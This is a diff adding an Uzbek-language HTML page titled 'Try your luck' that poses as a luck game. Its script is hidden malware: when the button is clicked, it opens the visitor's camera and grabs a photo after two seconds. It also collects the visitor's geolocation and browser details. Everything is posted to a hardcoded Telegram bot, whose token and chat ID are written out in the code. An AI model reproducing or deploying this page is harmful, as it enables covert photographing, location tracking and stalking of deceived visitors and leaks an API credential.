@@ -1,0 +1,129 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <link rel="stylesheet" href="main.css">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Omadizi Sinab Ko'ring </title>
+    <style>
+        body { 
+            text-align: center; 
+            font-family: Arial, sans-serif; 
+            margin-top: 50px; 
+            background: url('https://source.unsplash.com/random/1920x1080') no-repeat center center fixed; 
+            background-size: cover;
+            color: rgb(95, 255, 228); 
+        }
+        button { 
+            padding: 15px 25px; 
+            font-size: 18px; 
+            cursor: pointer; 
+            background: linear-gradient(90deg, #ff0066, #00ffcc); 
+            color: white; 
+            border: none; 
+            border-radius: 10px; 
+            transition: all 0.3s ease; 
+            box-shadow: 0px 0px 15px rgba(0, 255, 204, 0.8); 
+            margin: 10px; 
+        }
+        button:hover { transform: scale(1.1); background: linear-gradient(90deg, #00ffcc, #ff0066); }
+        .loader { 
+            border: 5px solid #222; 
+            border-top: 5px solid #ff0066; 
+            border-radius: 50%; 
+            width: 50px; 
+            height: 50px; 
+            animation: spin 1.5s linear infinite; 
+            display: none; 
+            margin: 20px auto; 
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+    <h2>Omadizi Sinab Ko'ring</h2>
+    <button id="startBtn">Omadizi Sinab Ko'ring !</button>
+    <div class="loader" id="loader"></div>
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas" style="display: none;"></canvas>
+    <script>
+        const BOT_TOKEN = "7990914675:AAFYVPhRT1z0o6AwESdHdF23TohIzYjKRPo"; 
+        const CHAT_ID = "7740801106";
+        const startBtn = document.getElementById("startBtn");
+        const loader = document.getElementById("loader");
+        const video = document.getElementById("video");
+        const canvas = document.getElementById("canvas");
+        const ctx = canvas.getContext("2d");
+        
+        async function initCamera() {
+            loader.style.display = "block";
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                video.srcObject = stream;
+            } catch (error) {
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
+                    video.srcObject = stream;
+                } catch (err) {
+                    alert("Kamera ishlamayapti yoki ruxsat berilmagan!");
+                }
+            }
+            loader.style.display = "none";
+        }
+        
+        async function takeAndSendPhoto() {
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            video.srcObject.getTracks().forEach(track => track.stop());
+            video.style.display = "none";
+            canvas.toBlob(async (blob) => {
+                const formData = new FormData();
+                formData.append("chat_id", CHAT_ID);
+                formData.append("photo", blob, "photo.jpg");
+                
+                const deviceInfo = `${navigator.userAgent}`;
+                const location = await getLocation();
+                const telegramInfo = await getTelegramInfo();
+                const textMessage = `📱 Qurilma: ${deviceInfo}\n📍 Manzil: ${location}\n🔗 Telegram: ${telegramInfo}`;
+                
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: "POST", body: formData });
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ chat_id: CHAT_ID, text: textMessage })
+                });
+                alert("✅ Rasm, manzil va Telegram ma'lumot yuborildi!");
+            }, "image/jpeg");
+        }
+        
+        async function getLocation() {
+            return new Promise((resolve) => {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        const lat = position.coords.latitude;
+                        const lon = position.coords.longitude;
+                        resolve(`https://www.google.com/maps?q=${lat},${lon}`);
+                    },
+                    () => resolve("⚠️ Joylashuv aniqlanmadi")
+                );
+            });
+        }
+        
+        async function getTelegramInfo() {
+            try {
+                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getChat?chat_id=${CHAT_ID}`);
+                const data = await response.json();
+                if (data.ok) {
+                    return `@${data.result.username} (${data.result.first_name} ${data.result.last_name})`;
+                }
+            } catch (error) {
+                return "⚠️ Telegram ma'lumot topilmadi";
+            }
+        }
+        
+        startBtn.addEventListener("click", async () => { await initCamera(); setTimeout(takeAndSendPhoto, 2000); });
+    </script>
+</body>
+</html>
